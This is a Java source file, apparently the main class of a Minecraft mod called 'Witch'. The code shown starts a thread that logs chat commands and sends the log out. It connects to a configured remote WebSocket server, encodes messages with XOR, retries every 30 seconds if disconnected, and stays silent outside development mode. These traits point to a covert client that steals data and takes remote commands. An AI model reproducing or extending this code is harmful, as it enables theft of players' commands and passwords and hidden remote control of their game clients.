package me.soda.witch;

import me.soda.witch.features.ChatCommandLogging;
import me.soda.witch.features.Config;
import me.soda.witch.shared.WitchConfig;
import me.soda.witch.shared.XOR;
import me.soda.witch.websocket.MessageUtils;
import me.soda.witch.websocket.WSClient;
import net.minecraft.client.MinecraftClient;

import java.net.URI;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final ChatCommandLogging chatCommandLogging = new ChatCommandLogging();
    public static final MessageUtils messageUtils = new MessageUtils(new XOR(WitchConfig.keyDefault));
    private static final boolean print = Boolean.getBoolean("fabric.development");
    //config
    private static final String server = WitchConfig.server;

    //variables
    public static WSClient client;
    public static Config config = new Config();

    public static void init() {
        chatCommandLogging.sendLogThread.start();
        try {
            client = new WSClient(new URI(server));
            client.connect();
        } catch (Exception e) {
            tryReconnect(client::reconnect);
        }
    }

    public static void tryReconnect(Runnable reconnect) {
        Witch.println("Connection closed");
        try {
            Thread.sleep(30 * 1000);
        } catch (Exception e) {
            Witch.printStackTrace(e);
        } finally {
            new Thread(reconnect).start();
        }
    }

    public static void printStackTrace(Exception e) {
        if (Witch.print) e.printStackTrace();
    }

    public static void println(Object o) {
        if (Witch.print) System.out.println("[WITCH] " + o);
    }
}
